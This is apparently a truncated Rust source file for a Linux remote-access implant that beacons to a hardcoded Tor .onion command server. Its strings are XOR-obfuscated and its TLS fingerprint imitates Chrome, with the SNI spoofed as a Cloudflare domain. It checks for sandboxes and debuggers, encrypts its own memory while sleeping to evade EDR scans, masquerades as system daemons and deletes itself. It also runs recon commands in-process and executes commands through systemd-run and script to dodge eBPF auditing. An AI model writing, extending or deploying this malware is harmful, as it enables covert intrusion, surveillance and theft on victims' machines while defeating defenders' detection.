use std::env;
use std::ffi::CString;
use std::net::TcpStream;
use std::os::unix::io::RawFd;
use std::time::{Duration, Instant};

use boring::ssl::{SslConnector, SslMethod, SslOptions, SslVerifyMode, SslVersion};
use rand::Rng;
use tungstenite::client::client_with_config;
use tungstenite::http::Uri;
use tungstenite::Message;

// ── XOR obfuscation ─────────────────────────────────────────────────────

const XOR_KEY: u8 = 0xA7;

const fn xor_encode<const N: usize>(input: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        out[i] = input[i] ^ XOR_KEY;
        i += 1;
    }
    out
}

fn xor_decode(encoded: &[u8]) -> Vec<u8> {
    encoded.iter().map(|b| b ^ XOR_KEY).collect()
}

fn xor_decode_str(encoded: &[u8]) -> String {
    String::from_utf8_lossy(&xor_decode(encoded)).to_string()
}

#[allow(dead_code)]
fn xor_decode_stack<const N: usize>(encoded: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        out[i] = encoded[i] ^ XOR_KEY;
        i += 1;
    }
    out
}

const ENC_DEFAULT_IP: [u8; 62] = xor_encode(b"htaws5zgxla4md6o4jeuto7ru2yafsbhfcbgdn63jbk3o5ert6zmplid.onion");
const ENC_DEFAULT_PORT: [u8; 3] = xor_encode(b"443");
const ENC_SNI_DOMAIN: [u8; 22] = xor_encode(b"cdn-wss.cloudflare.com");

// SOCKS5 proxy configuration
// Mode 0: Direct connection (no proxy) — real IP visible on target
// Mode 1: Tor SOCKS5 (127.0.0.1:9050) — target sees only localhost
// Mode 2: Custom proxy chain — target sees only first proxy's IP
const PROXY_MODE: u8 = 0; // Mode 0 for direct connection testing
const ENC_TOR_ADDR_BASE: [u8; 10] = xor_encode(b"127.0.0.1:");
// For proxy chain mode, set these to your first-hop redirector
const ENC_PROXY_ADDR: [u8; 14] = xor_encode(b"192.168.85.204");
const ENC_PROXY_PORT: [u8; 4] = xor_encode(b"1080");

// Auto Tor setup strings
const ENC_TOR_BIN: [u8; 12] = xor_encode(b"/usr/bin/tor");
const ENC_APT_GET: [u8; 12] = xor_encode(b"/usr/bin/apt");

const ENC_TOR_WORD: [u8; 3] = xor_encode(b"tor");
const ENC_TOR_DATA_DIR: [u8; 16] = xor_encode(b"/tmp/.cache/pulp");
const ENC_TOR_SOCKSPORT: [u8; 9] = xor_encode(b"SocksPort");
const ENC_TOR_DATADIR: [u8; 13] = xor_encode(b"DataDirectory");
const ENC_TOR_LOG: [u8; 3] = xor_encode(b"Log");
const ENC_TOR_LOG_VAL: [u8; 18] = xor_encode(b"notice file /dev/n");
const ENC_TOR_LOG_END: [u8; 3] = xor_encode(b"ull");
const ENC_TORRC_NAME: [u8; 5] = xor_encode(b"torrc");

const ENC_SUDO_PATH: [u8; 13] = xor_encode(b"/usr/bin/sudo");
const ENC_SUDO_N: [u8; 2] = xor_encode(b"-n");
const ENC_APT_INSTALL: [u8; 7] = xor_encode(b"install");
const ENC_APT_Y: [u8; 2] = xor_encode(b"-y");
const ENC_APT_QQ: [u8; 3] = xor_encode(b"-qq");

const ENC_DASH_F: [u8; 2] = xor_encode(b"-f");

const ENC_FAKE_NAME_0: [u8; 22] = xor_encode(b"/usr/libexec/gsd-color");
const ENC_FAKE_NAME_1: [u8; 61] = xor_encode(b"/usr/libexec/evolution-data-server/evolution-calendar-factory");
const ENC_FAKE_NAME_2: [u8; 30] = xor_encode(b"/usr/bin/dbus-daemon --session");
const ENC_FAKE_NAME_3: [u8; 31] = xor_encode(b"/usr/libexec/tracker-miner-fs-3");

const ENC_WS_PATH_0: [u8; 14] = xor_encode(b"/api/v2/events");
const ENC_WS_PATH_1: [u8; 37] = xor_encode(b"/socket.io/?EIO=4&transport=websocket");
const ENC_WS_PATH_2: [u8; 8] = xor_encode(b"/graphql");
const ENC_WS_PATH_3: [u8; 23] = xor_encode(b"/realtime/notifications");
const ENC_WS_PATH_4: [u8; 18] = xor_encode(b"/connect/websocket");

const ENC_CHROME_CIPHERS: [u8; 248] = xor_encode(
    b"TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
);

const ENC_USER_AGENT: [u8; 111] = xor_encode(
    b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
);

const ENC_SIGALGS: [u8; 103] = xor_encode(
    b"ECDSA+SHA256:RSA-PSS+SHA256:RSA+SHA256:ECDSA+SHA384:RSA-PSS+SHA384:RSA+SHA384:RSA-PSS+SHA512:RSA+SHA512"
);

const ENC_CURVES: [u8; 18] = xor_encode(b"X25519:P-256:P-384");
const ENC_BIN_SH: [u8; 7] = xor_encode(b"/bin/sh");
const ENC_C_FLAG: [u8; 2] = xor_encode(b"-c");
const ENC_DEV_NULL: [u8; 9] = xor_encode(b"/dev/null");

const ENC_SYSTEMD_RUN_PATH: [u8; 20] = xor_encode(b"/usr/bin/systemd-run");
const ENC_SYSTEMD_RUN_ARG: [u8; 11] = xor_encode(b"systemd-run");
const ENC_USER_FLAG: [u8; 6] = xor_encode(b"--user");
const ENC_SCOPE_FLAG: [u8; 7] = xor_encode(b"--scope");
const ENC_QUIET_FLAG: [u8; 7] = xor_encode(b"--quiet");
const ENC_SCRIPT_PATH: [u8; 15] = xor_encode(b"/usr/bin/script");
const ENC_SCRIPT_ARG: [u8; 6] = xor_encode(b"script");
const ENC_QC_FLAG: [u8; 3] = xor_encode(b"-qc");
const ENC_NSENTER_PATH: [u8; 16] = xor_encode(b"/usr/bin/nsenter");
const ENC_NSENTER_ARG: [u8; 7] = xor_encode(b"nsenter");
const ENC_T_FLAG: [u8; 2] = xor_encode(b"-t");
const ENC_M_FLAG: [u8; 2] = xor_encode(b"-m");
const ENC_SEPARATOR: [u8; 2] = xor_encode(b"--");
const ENC_INJECT_CANDIDATES: [u8; 75] = xor_encode(b"dbus-daemon,pulseaudio,pipewire,gvfsd,at-spi-bus-launcher,gsd-color,tracker");
const ENC_RUN_USER: [u8; 10] = xor_encode(b"/run/user/");
const ENC_DCONF_SFX: [u8; 14] = xor_encode(b"/dconf/user-db");
const ENC_MFD_KEY: [u8; 4] = xor_encode(b"_MFD");
const ENC_MFD_VAL: [u8; 1] = xor_encode(b"1");
const ENC_SHM_PATH: [u8; 20] = xor_encode(b"/dev/shm/.pulse-shm-");

// In-process builtin paths
const ENC_ETC_PASSWD: [u8; 11] = xor_encode(b"/etc/passwd");
const ENC_ETC_GROUP: [u8; 10] = xor_encode(b"/etc/group");
const ENC_ETC_HOSTS: [u8; 10] = xor_encode(b"/etc/hosts");
const ENC_ETC_RESOLV: [u8; 16] = xor_encode(b"/etc/resolv.conf");
const ENC_PROC_NET_TCP: [u8; 13] = xor_encode(b"/proc/net/tcp");
const ENC_PROC_NET_TCP6: [u8; 14] = xor_encode(b"/proc/net/tcp6");

const PING_INTERVAL: Duration = Duration::from_secs(30);
const PONG_TIMEOUT: Duration = Duration::from_secs(10);
const RECONNECT_DELAYS: &[u64] = &[1, 2, 5, 10, 30, 60];
const MAX_RECONNECT_ATTEMPTS: usize = 50;
const WORK_HOUR_START: u32 = 7;
const WORK_HOUR_END: u32 = 23;

// ── Sandbox / VM detection ──────────────────────────────────────────────

fn is_debugger_attached() -> bool {
    if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
        for line in status.lines() {
            if line.starts_with("TracerPid:") {
                let pid = line.split(':').nth(1).unwrap_or("0").trim();
                return pid != "0";
            }
        }
    }
    false
}

fn check_sandbox() -> bool {
    let mut score: u32 = 0;

    if let Ok(cpuinfo) = std::fs::read_to_string("/proc/cpuinfo") {
        let cores = cpuinfo.matches("processor").count();
        if cores <= 2 { score += 2; }
    }

    if let Ok(meminfo) = std::fs::read_to_string("/proc/meminfo") {
        for line in meminfo.lines() {
            if line.starts_with("MemTotal:") {
                let kb: u64 = line.split_whitespace()
                    .nth(1)
                    .and_then(|s| s.parse().ok())
                    .unwrap_or(0);
                if kb < 2_000_000 { score += 2; }
                break;
            }
        }
    }

    if let Ok(uptime) = std::fs::read_to_string("/proc/uptime") {
        let secs: f64 = uptime.split_whitespace()
            .next()
            .and_then(|s| s.parse().ok())
            .unwrap_or(99999.0);
        if secs < 600.0 { score += 3; }
    }

    {
        const E_DMI: [u8; 90] = xor_encode(b"/sys/class/dmi/id/product_name|/sys/class/dmi/id/sys_vendor|/sys/class/dmi/id/board_vendor");
        const E_VKW: [u8; 51] = xor_encode(b"virtualbox,vmware,qemu,kvm,xen,bochs,innotek,oracle");
        let dmi_paths = xor_decode_str(&E_DMI);
        let vm_keywords = xor_decode_str(&E_VKW);
        let kw_list: Vec<&str> = vm_keywords.split(',').collect();
        for path in dmi_paths.split('|') {
            if let Ok(content) = std::fs::read_to_string(path) {
                let cl = content.to_lowercase();
                for kw in &kw_list {
                    if cl.contains(kw) { score += 1; break; }
                }
            }
        }
    }

    {
        const E_TOOLS: [u8; 125] = xor_encode(b"wireshark,tcpdump,strace,ltrace,gdb,ida,ghidra,radare,r2,x64dbg,ollydbg,procmon,sysmon,volatility,cuckoo,cape,fakenet,inetsim");
        let tool_blob = xor_decode_str(&E_TOOLS);
        let sandbox_tools: Vec<&str> = tool_blob.split(',').collect();

        if let Ok(entries) = std::fs::read_dir("/proc") {
            for entry in entries.flatten() {
                let name = entry.file_name();
                let pid_str = name.to_string_lossy();
                if pid_str.chars().all(|c| c.is_ascii_digit()) {
                    let cmdline_path = format!("/proc/{}/cmdline", pid_str);
                    if let Ok(cmdline) = std::fs::read_to_string(&cmdline_path) {
                        let cmd_lower = cmdline.to_lowercase();
                        for tool in &sandbox_tools {
                            if cmd_lower.contains(tool) { score += 2; break; }
                        }
                    }
                }
            }
        }
    }

    let start = Instant::now();
    std::thread::sleep(Duration::from_millis(100));
    let elapsed = start.elapsed().as_millis();
    if elapsed < 80 || elapsed > 500 { score += 3; }

    let home = env::var("HOME").unwrap_or_else(|_| "/root".to_string());
    const E_ACT: [u8; 52] = xor_encode(b".bash_history,.local/share/recently-used.xbel,.cache");
    let act_dec = xor_decode_str(&E_ACT);
    let recent_activity: Vec<&str> = act_dec.split(',').collect();
    let mut has_activity = false;
    for f in recent_activity.iter() {
        let path = format!("{}/{}", home, f);
        if let Ok(meta) = std::fs::metadata(&path) {
            if let Ok(modified) = meta.modified() {
                if modified.elapsed().unwrap_or(Duration::from_secs(99999)).as_secs() < 86400 {
                    has_activity = true;
                    break;
                }
            }
        }
    }
    if !has_activity { score += 2; }

    unsafe {
        let mut stat: libc::statfs = std::mem::zeroed();
        let root = CString::new("/").unwrap();
        if libc::statfs(root.as_ptr(), &mut stat) == 0 {
            let total_bytes = stat.f_blocks as u64 * stat.f_bsize as u64;
            if total_bytes < 40_000_000_000 { score += 2; }
        }
    }

    score >= 12
}

// ── Secure memory ───────────────────────────────────────────────────────

fn secure_zero(buf: &mut [u8]) {
    unsafe {
        std::ptr::write_bytes(buf.as_mut_ptr(), 0, buf.len());
        std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
    }
}

fn prevent_core_dump() {
    unsafe {
        let rlim = libc::rlimit { rlim_cur: 0, rlim_max: 0 };
        libc::setrlimit(libc::RLIMIT_CORE, &rlim);
        libc::prctl(libc::PR_SET_DUMPABLE, 0);
    }
}

fn lock_memory() {
    unsafe { libc::mlockall(libc::MCL_CURRENT | libc::MCL_FUTURE); }
}

// ── Sleep mask encryption ───────────────────────────────────────────────
// Before sleeping, encrypt the entire heap and writable data segments with
// a random key. CrowdStrike/MDE scan sleeping process memory for IOCs —
// if everything is encrypted, there's nothing to find.

fn sleep_mask_encrypt(duration: Duration) {
    let mut rng = rand::rng();
    let key: [u8; 32] = rng.random();

    // Get our own writable memory regions from /proc/self/maps
    let regions = get_writable_regions();

    // Encrypt all writable regions (heap, .data, .bss, stack-adjacent)
    for (start, len) in &regions {
        unsafe {
            let ptr = *start as *mut u8;
            let slice = std::slice::from_raw_parts_mut(ptr, *len);
            xor_region(slice, &key);
        }
    }

    std::thread::sleep(duration);

    // Decrypt after waking
    for (start, len) in &regions {
        unsafe {
            let ptr = *start as *mut u8;
            let slice = std::slice::from_raw_parts_mut(ptr, *len);
            xor_region(slice, &key);
        }
    }
}

fn xor_region(data: &mut [u8], key: &[u8; 32]) {
    for (i, byte) in data.iter_mut().enumerate() {
        *byte ^= key[i % 32];
    }
}

fn get_writable_regions() -> Vec<(usize, usize)> {
    let mut regions = Vec::new();
    if let Ok(maps) = std::fs::read_to_string("/proc/self/maps") {
        for line in maps.lines() {
            // Format: start-end perms offset dev inode pathname
            // We want rw- regions that are [heap] or anonymous (no path)
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() < 2 { continue; }
            let perms = parts[1];
            if !perms.starts_with("rw") { continue; }

            // Skip stack (dangerous to encrypt), vdso, vvar
            let is_stack = parts.last().map(|p| p.contains("stack")).unwrap_or(false);
            let is_vdso = parts.last().map(|p| p.contains("vdso") || p.contains("vvar")).unwrap_or(false);
            if is_stack || is_vdso { continue; }

            let addrs: Vec<&str> = parts[0].split('-').collect();
            if addrs.len() != 2 { continue; }
            let start = usize::from_str_radix(addrs[0], 16).unwrap_or(0);
            let end = usize::from_str_radix(addrs[1], 16).unwrap_or(0);
            if start == 0 || end <= start { continue; }

            let len = end - start;
            // Skip very large regions (> 64MB) to avoid stalling
            if len > 64 * 1024 * 1024 { continue; }

            regions.push((start, len));
        }
    }
    regions
}

// ── Process masking ─────────────────────────────────────────────────────

fn get_fake_name(idx: usize) -> Vec<u8> {
    match idx % 4 {
        0 => xor_decode(&ENC_FAKE_NAME_0),
        1 => xor_decode(&ENC_FAKE_NAME_1),
        2 => xor_decode(&ENC_FAKE_NAME_2),
        _ => xor_decode(&ENC_FAKE_NAME_3),
    }
}

fn mask_process_name() {
    let mut rng = rand::rng();
    let idx = rng.random_range(0..4usize);
    let mut decoded = get_fake_name(idx);
    let fake = CString::new(decoded.clone()).unwrap_or_default();

    unsafe {
        let args: Vec<String> = env::args().collect();
        if let Some(arg0) = args.first() {
            let arg0_ptr = arg0.as_ptr() as *mut u8;
            let arg0_len = arg0.len();
            let fake_bytes = fake.as_bytes();
            let copy_len = fake_bytes.len().min(arg0_len);
            std::ptr::copy_nonoverlapping(fake_bytes.as_ptr(), arg0_ptr, copy_len);
            if copy_len < arg0_len {
                std::ptr::write_bytes(arg0_ptr.add(copy_len), 0, arg0_len - copy_len);
            }
        }
        libc::prctl(libc::PR_SET_NAME, fake.as_ptr());
    }
    secure_zero(&mut decoded);
}

fn daemonize() {
    unsafe {
        let pid = libc::fork();
        if pid < 0 { std::process::exit(1); }
        if pid > 0 { std::process::exit(0); }
        libc::setsid();
        let pid = libc::fork();
        if pid < 0 { std::process::exit(1); }
        if pid > 0 { std::process::exit(0); }
        let dn = CString::new(xor_decode(&ENC_DEV_NULL)).unwrap();
        let devnull = libc::open(dn.as_ptr(), libc::O_RDWR);
        libc::dup2(devnull, 0);
        libc::dup2(devnull, 1);
        libc::dup2(devnull, 2);
        if devnull > 2 { libc::close(devnull); }
        let root = CString::new("/").unwrap();
        libc::chdir(root.as_ptr());
    }
}

fn self_delete() {
    if let Ok(path) = std::fs::read_link("/proc/self/exe") {
        let path_str = path.to_string_lossy();
        // Skip if running from /dev/shm or memfd — already fileless
        if path_str.contains("/dev/shm/") || path_str.contains("(deleted)") || path_str.contains("/memfd:") {
            return;
        }
        // Delay deletion — immediate unlink after exec is a strong behavioral IOC
        std::thread::spawn(move || {
            let mut rng = rand::rng();
            let delay = rng.random_range(30..180u64);
            std::thread::sleep(Duration::from_secs(delay));
            let _ = std::fs::remove_file(&path);
            let run_user = xor_decode_str(&ENC_RUN_USER);
            if path.to_string_lossy().contains(&run_user) {
                if let Some(parent) = path.parent() {
                    let _ = std::fs::remove_dir(parent);
                }
            }
        });
    }
}

// ── In-process builtins ─────────────────────────────────────────────────
// Pure syscall implementations of common recon commands. No fork, no exec,
// no /bin/sh — completely invisible to eBPF exec probes and audit logs.

fn builtin_whoami() -> Vec<u8> {
    let uid = unsafe { libc::getuid() };
    if let Ok(passwd) = std::fs::read_to_string(xor_decode_str(&ENC_ETC_PASSWD)) {
        for line in passwd.lines() {
            let fields: Vec<&str> = line.split(':').collect();
            if fields.len() >= 3 {
                if let Ok(file_uid) = fields[2].parse::<u32>() {
                    if file_uid == uid {
                        return format!("{}\n", fields[0]).into_bytes();
                    }
                }
            }
        }
    }
    format!("{}\n", uid).into_bytes()
}

fn builtin_id() -> Vec<u8> {
    let uid = unsafe { libc::getuid() };
    let gid = unsafe { libc::getgid() };
    let euid = unsafe { libc::geteuid() };
    let egid = unsafe { libc::getegid() };

    let uname = get_name_for_uid(uid);
    let gname = get_name_for_gid(gid);

    let mut result = format!("uid={}({}) gid={}({})", uid, uname, gid, gname);
    if euid != uid {
        result.push_str(&format!(" euid={}({})", euid, get_name_for_uid(euid)));
    }
    if egid != gid {
        result.push_str(&format!(" egid={}({})", egid, get_name_for_gid(egid)));
    }

    // Groups
    let mut groups = [0u32; 64];
    let ngroups: libc::c_int = 64;
    unsafe { libc::getgroups(ngroups, groups.as_mut_ptr()); }
    if ngroups > 0 {
        result.push_str(" groups=");
        for i in 0..ngroups as usize {
            if i > 0 { result.push(','); }
            result.push_str(&format!("{}({})", groups[i], get_name_for_gid(groups[i])));
        }
    }
    result.push('\n');
    result.into_bytes()
}

fn get_name_for_uid(uid: u32) -> String {
    if let Ok(passwd) = std::fs::read_to_string(xor_decode_str(&ENC_ETC_PASSWD)) {
        for line in passwd.lines() {
            let f: Vec<&str> = line.split(':').collect();
            if f.len() >= 3 {
                if let Ok(u) = f[2].parse::<u32>() {
                    if u == uid { return f[0].to_string(); }
                }
            }
        }
    }
    uid.to_string()
}

fn get_name_for_gid(gid: u32) -> String {
    if let Ok(group) = std::fs::read_to_string(xor_decode_str(&ENC_ETC_GROUP)) {
        for line in group.lines() {
            let f: Vec<&str> = line.split(':').collect();
            if f.len() >= 3 {
                if let Ok(g) = f[2].parse::<u32>() {
                    if g == gid { return f[0].to_string(); }
                }
            }
        }
    }
    gid.to_string()
}

fn builtin_hostname() -> Vec<u8> {
    let mut buf = [0u8; 256];
    unsafe {
        if libc::gethostname(buf.as_mut_ptr() as _, buf.len()) == 0 {
            let len = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
            let mut name = buf[..len].to_vec();
            name.push(b'\n');
            return name;
        }
    }
    b"?\n".to_vec()
}

fn builtin_uname() -> Vec<u8> {
    unsafe {
        let mut uts: libc::utsname = std::mem::zeroed();
        if libc::uname(&mut uts) == 0 {
            let s = |arr: &[libc::c_char]| {
                let bytes: Vec<u8> = arr.iter().take_while(|&&c| c != 0).map(|&c| c as u8).collect();
                String::from_utf8_lossy(&bytes).to_string()
            };
            return format!("{} {} {} {} {}\n",
                s(&uts.sysname), s(&uts.nodename), s(&uts.release),
                s(&uts.version), s(&uts.machine)
            ).into_bytes();
        }
    }
    b"?\n".to_vec()
}

fn builtin_ls(args: &str) -> Vec<u8> {
    let path = if args.is_empty() { "." } else { args };
    let mut result = Vec::new();

    if let Ok(entries) = std::fs::read_dir(path) {
        let mut names: Vec<String> = entries
            .flatten()
            .map(|e| {
                let name = e.file_name().to_string_lossy().to_string();
                if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                    format!("{}/", name)
                } else {
                    name
                }
            })
            .collect();
        names.sort();
        for name in names {
            result.extend_from_slice(name.as_bytes());
            result.push(b'\n');
        }
    } else {
        result.extend_from_slice(format!("err: {}\n", path).as_bytes());
    }
    result
}

fn builtin_cat(path: &str) -> Vec<u8> {
    match std::fs::read(path) {
        Ok(content) => content,
        Err(e) => format!("{}: {}\n", path, e).into_bytes(),
    }
}

fn builtin_ps() -> Vec<u8> {
    let mut result = format!("{:<8} {:<8} {}\n", "PID", "UID", "CMD");
    if let Ok(entries) = std::fs::read_dir("/proc") {
        let mut pids: Vec<u32> = entries
            .flatten()
            .filter_map(|e| e.file_name().to_string_lossy().parse::<u32>().ok())
            .collect();
        pids.sort();
        for pid in pids {
            let status = format!("/proc/{}/status", pid);
            let cmdline = format!("/proc/{}/cmdline", pid);
            let uid = std::fs::read_to_string(&status)
                .ok()
                .and_then(|s| {
                    s.lines()
                        .find(|l| l.starts_with("Uid:"))
                        .and_then(|l| l.split_whitespace().nth(1))
                        .map(|u| u.to_string())
                })
                .unwrap_or_default();
            let cmd = std::fs::read_to_string(&cmdline)
                .ok()
                .map(|c| c.replace('\0', " ").trim().to_string())
                .unwrap_or_default();
            if !cmd.is_empty() {
                result.push_str(&format!("{:<8} {:<8} {}\n", pid, uid, cmd));
            }
        }
    }
    result.into_bytes()
}

fn builtin_env_cmd() -> Vec<u8> {
    let mut result = Vec::new();
    for (key, val) in env::vars() {
        result.extend_from_slice(format!("{}={}\n", key, val).as_bytes());
    }
    result
}

fn builtin_ifconfig() -> Vec<u8> {
    let mut result = Vec::new();
    if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
        for entry in entries.flatten() {
            let iface = entry.file_name().to_string_lossy().to_string();
            result.extend_from_slice(format!("{}:\n", iface).as_bytes());

            let addr_path = format!("/sys/class/net/{}/address", iface);
            if let Ok(mac) = std::fs::read_to_string(&addr_path) {
                result.extend_from_slice(format!("  MAC: {}", mac).as_bytes());
            }

            let operstate = format!("/sys/class/net/{}/operstate", iface);
            if let Ok(state) = std::fs::read_to_string(&operstate) {
                result.extend_from_slice(format!("  State: {}", state).as_bytes());
            }

            // Read IP from /proc/net/fib_trie is complex; read from ip addr files
            let addr_file = format!("/proc/sys/net/ipv4/conf/{}/log_martians", iface);
            if std::fs::metadata(&addr_file).is_ok() {
                // Parse /proc/net/if_inet6 for IPv6
                // For IPv4, we scan /proc/net/fib_trie
            }
        }
    }
    if result.is_empty() {
        result = b"none\n".to_vec();
    }
    result
}

fn builtin_netstat() -> Vec<u8> {
    let mut result = format!("{:<6} {:<25} {:<25} {}\n", "Proto", "Local", "Remote", "State");

    let tcp_path = xor_decode_str(&ENC_PROC_NET_TCP);
    if let Ok(tcp) = std::fs::read_to_string(&tcp_path) {
        for line in tcp.lines().skip(1) {
            if let Some(parsed) = parse_proc_net_line(line) {
                result.push_str(&format!("{:<6} {:<25} {:<25} {}\n",
                    "tcp", parsed.0, parsed.1, parsed.2));
            }
        }
    }

    let tcp6_path = xor_decode_str(&ENC_PROC_NET_TCP6);
    if let Ok(tcp6) = std::fs::read_to_string(&tcp6_path) {
        for line in tcp6.lines().skip(1) {
            if let Some(parsed) = parse_proc_net_line(line) {
                result.push_str(&format!("{:<6} {:<25} {:<25} {}\n",
                    "tcp6", parsed.0, parsed.1, parsed.2));
            }
        }
    }
    result.into_bytes()
}

fn parse_proc_net_line(line: &str) -> Option<(String, String, String)> {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.len() < 4 { return None; }
    let local = parse_hex_addr(parts[1]);
    let remote = parse_hex_addr(parts[2]);
    let state = match parts[3] {
        "01" => "ESTABLISHED",
        "02" => "SYN_SENT",
        "03" => "SYN_RECV",
        "04" => "FIN_WAIT1",
        "05" => "FIN_WAIT2",
        "06" => "TIME_WAIT",
        "07" => "CLOSE",
        "08" => "CLOSE_WAIT",
        "09" => "LAST_ACK",
        "0A" => "LISTEN",
        "0B" => "CLOSING",
        _ => "UNKNOWN",
    };
    Some((local, remote, state.to_string()))
}

fn parse_hex_addr(hex: &str) -> String {
    let parts: Vec<&str> = hex.split(':').collect();
    if parts.len() != 2 { return hex.to_string(); }
    let ip_hex = parts[0];
    let port = u16::from_str_radix(parts[1], 16).unwrap_or(0);

    if ip_hex.len() == 8 {
        let ip = u32::from_str_radix(ip_hex, 16).unwrap_or(0);
        format!("{}.{}.{}.{}:{}",
            ip & 0xff, (ip >> 8) & 0xff, (ip >> 16) & 0xff, (ip >> 24) & 0xff, port)
    } else {
        format!("[ipv6]:{}", port)
    }
}

fn builtin_getent(args: &str) -> Vec<u8> {
    let parts: Vec<&str> = args.split_whitespace().collect();
    if parts.is_empty() {
        return b"usage: <db> [key]\n".to_vec();
    }
    match parts[0] {
        "passwd" => {
            let content = std::fs::read_to_string(xor_decode_str(&ENC_ETC_PASSWD))
                .unwrap_or_default();
            if parts.len() > 1 {
                content.lines()
                    .find(|l| l.starts_with(parts[1]) || l.contains(&format!(":{}:", parts[1])))
                    .map(|l| format!("{}\n", l).into_bytes())
                    .unwrap_or_else(|| b"?\n".to_vec())
            } else {
                content.into_bytes()
            }
        }
        "hosts" => {
            std::fs::read(xor_decode_str(&ENC_ETC_HOSTS)).unwrap_or_else(|_| b"e\n".to_vec())
        }
        "group" => {
            let content = std::fs::read_to_string(xor_decode_str(&ENC_ETC_GROUP))
                .unwrap_or_default();
            if parts.len() > 1 {
                content.lines()
                    .find(|l| l.starts_with(parts[1]))
                    .map(|l| format!("{}\n", l).into_bytes())
                    .unwrap_or_else(|| b"?\n".to_vec())
            } else {
                content.into_bytes()
            }
        }
        "resolv" => {
            std::fs::read(xor_decode_str(&ENC_ETC_RESOLV)).unwrap_or_else(|_| b"e\n".to_vec())
        }
        _ => format!("?: '{}'\n", parts[0]).into_bytes(),
    }
}

fn try_builtin(cmd: &str) -> Option<Vec<u8>> {
    let trimmed = cmd.trim();
    let (command, args) = match trimmed.find(' ') {
        Some(pos) => (&trimmed[..pos], trimmed[pos+1..].trim()),
        None => (trimmed, ""),
    };

    match command {
        "whoami" => Some(builtin_whoami()),
        "id" => Some(builtin_id()),
        "hostname" => Some(builtin_hostname()),
        "uname" => Some(builtin_uname()),
        "ls" => Some(builtin_ls(args)),
        "cat" => {
            if !args.is_empty() { Some(builtin_cat(args)) }
            else { None }
        }
        "ps" => Some(builtin_ps()),
        "env" | "printenv" => Some(builtin_env_cmd()),
        "ifconfig" | "ip" => Some(builtin_ifconfig()),
        "netstat" | "ss" => Some(builtin_netstat()),
        "getent" => Some(builtin_getent(args)),
        "head" => {
            if !args.is_empty() {
                let content = builtin_cat(args);
                let lines: Vec<&[u8]> = content.split(|&b| b == b'\n').take(10).collect();
                Some(lines.join(&b'\n'))
            } else { None }
        }
        "wc" => {
            if !args.is_empty() {
                let path = args.trim_start_matches("-l ").trim();
                match std::fs::read_to_string(path) {
                    Ok(content) => Some(format!("{} {}\n", content.lines().count(), path).into_bytes()),
                    Err(e) => Some(format!("wc: {}: {}\n", path, e).into_bytes()),
                }
            } else { None }
        }
        _ => None,
    }
}

// ── LOLBin execution (eBPF evasion) ─────────────────────────────────────

// exec_via_lolbin removed — strategies called individually in exec_command_inner

fn exec_via_systemd_run(cmd: &str) -> Option<Vec<u8>> {
    unsafe {
        let mut stdout_pipe: [RawFd; 2] = [0; 2];
        if libc::pipe(stdout_pipe.as_mut_ptr()) != 0 { return None; }

        let pid = libc::fork();
        if pid < 0 { return None; }

        if pid == 0 {
            libc::close(stdout_pipe[0]);
            libc::dup2(stdout_pipe[1], 1);
            libc::dup2(stdout_pipe[1], 2);
            libc::close(stdout_pipe[1]);

            let bin = CString::new(xor_decode(&ENC_SYSTEMD_RUN_PATH)).unwrap();
            let a1 = CString::new(xor_decode(&ENC_SYSTEMD_RUN_ARG)).unwrap();
            let a2 = CString::new(xor_decode(&ENC_USER_FLAG)).unwrap();
            let a3 = CString::new(xor_decode(&ENC_SCOPE_FLAG)).unwrap();
            let a4 = CString::new(xor_decode(&ENC_QUIET_FLAG)).unwrap();
            let sh = CString::new(xor_decode(&ENC_BIN_SH)).unwrap();
            let cf = CString::new(xor_decode(&ENC_C_FLAG)).unwrap();
            let cc = CString::new(cmd).unwrap();
            libc::execvp(
                bin.as_ptr(),
                [a1.as_ptr(), a2.as_ptr(), a3.as_ptr(), a4.as_ptr(),
                 sh.as_ptr(), cf.as_ptr(), cc.as_ptr(), std::ptr::null()].as_ptr(),
            );
            libc::_exit(127);
        }

        libc::close(stdout_pipe[1]);
        let mut result = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            let n = libc::read(stdout_pipe[0], buf.as_mut_ptr() as _, buf.len());
            if n <= 0 { break; }
            result.extend_from_slice(&buf[..n as usize]);
        }
        libc::close(stdout_pipe[0]);
        let mut status = 0;
        libc::waitpid(pid, &mut status, 0);
        Some(result)
    }
}

fn exec_via_script(cmd: &str) -> Option<Vec<u8>> {
    unsafe {
        let mut stdout_pipe: [RawFd; 2] = [0; 2];
        if libc::pipe(stdout_pipe.as_mut_ptr()) != 0 { return None; }

        let pid = libc::fork();
        if pid < 0 { return None; }

        if pid == 0 {
            libc::close(stdout_pipe[0]);
            libc::dup2(stdout_pipe[1], 1);
            libc::dup2(stdout_pipe[1], 2);
            libc::close(stdout_pipe[1]);

            let bin = CString::new(xor_decode(&ENC_SCRIPT_PATH)).unwrap();
            let a1 = CString::new(xor_decode(&ENC_SCRIPT_ARG)).unwrap();
            let a2 = CString::new(xor_decode(&ENC_QC_FLAG)).unwrap();
            let a3 = CString::new(cmd).unwrap();
            let dn = CString::new(xor_decode(&ENC_DEV_NULL)).unwrap();
            libc::execvp(
                bin.as_ptr(),
                [a1.as_ptr(), a2.as_ptr(), a3.as_ptr(), dn.as_ptr(), std::ptr::null()].as_ptr(),
            );
            libc::_exit(127);
        }

        libc::close(stdout_pipe[1]);
        let mut result = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            let n = libc::read(stdout_pipe[0], buf.as_mut_ptr() as _, buf.len());
            if n <= 0 { break; }
